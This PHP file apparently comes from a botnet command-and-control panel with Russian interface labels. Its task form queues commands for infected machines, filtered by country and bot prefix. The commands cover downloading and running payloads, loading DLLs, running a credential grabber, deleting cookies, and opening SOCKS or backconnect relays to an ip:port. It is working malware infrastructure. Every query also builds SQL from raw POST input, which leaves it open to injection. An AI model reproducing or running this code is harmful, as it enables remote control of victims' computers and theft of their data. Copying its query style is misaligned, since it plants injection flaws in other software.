<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

get_function('rc');

function str2db($str){
	global $config, $rc;
	
	if(function_exists('save_history_log')){
		//$txt = 'Action: Add task' . "\r\n";
		//$txt .= 'Cmd: ' . $str;
		thl('Action: Add task');
		thl('Cmd: ' . $str);
		save_history_log();
	}
	
	if($config['scramb'] == 1){
		return rc_encode($str);
	}else{
		return $str;
	}
}

if($_POST['submit']){
	$time = time();

	if(!empty($_POST['country'][0]) && $_POST['country'][0] != '*'){
		$country = implode('|', $_POST['country']) . '|';
	}else{
		$country = '*';
	}

	if(!empty($_POST['prefix'][0]) && $_POST['prefix'][0] != '*'){
		$prefix = implode('|', $_POST['prefix']) . '|';
	}else{
		if(!empty($_SESSION['user']->config['prefix'])){
			$prefix = $_SESSION['user']->config['prefix'];
		}else{
			$prefix = '*';
		}
	}

	switch($_POST['type']){
		case 'download':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('download ' . $_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Скачать файл\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'multidownload':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('multidownload ' . str_replace(' ', '|', $_POST['link']) . '|').'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Скачать файл (Multi)\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'update':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('update '.$_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Обновление\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'grabber':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('grabber').'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Граббер\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'load_dll':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('loaddll '.$_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Загрузка DLL\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'startsb':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('startsb').'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Запустить SB\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'stopsb':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('stopsb').'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Остановить SB\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'updateconfig':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('updateconfig '.$_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Обновить конфиг\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'deletecookies':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('deletecookies').'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'Удалить куки\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'sb':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('sb '.$_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'sb ip:port\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		case 'bc':
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db('bc '.$_POST['link']).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \'bk ip:port\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	
		default:
			$mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, str, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.str2db($_POST['type'].(!empty($_POST['link'])?' '.$_POST['link']:'')).'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['type'].'\', \''.$_SESSION['user']->id.'\', \''.time().'\')');
		break;
	}
	//print_rm($smarty->tpl_vars);
	print('<script language="javascript" type="application/javascript">window_close(document.getElementById(\'div_sub_'.($smarty->tpl_vars['rand_name']->value).'\').parentNode.id.replace(\'_content\', \'_wid\'), 1); get_hax({url: \'/bots/jobs.html?ajax=1\', id: \'content\'});</script>');
}

include_once('modules/bots/country_code.php');
$smarty->assign('country_code', $country_code);

$country = $mysqli->query_cache('SELECT code FROM bf_country ORDER by code ASC', null, 3600, true);
$smarty->assign('country', $country);

$prefix = scandir('cache/prefix/', false);
unset($prefix[0], $prefix[1]);
$smarty->assign("prefix", $prefix);

?>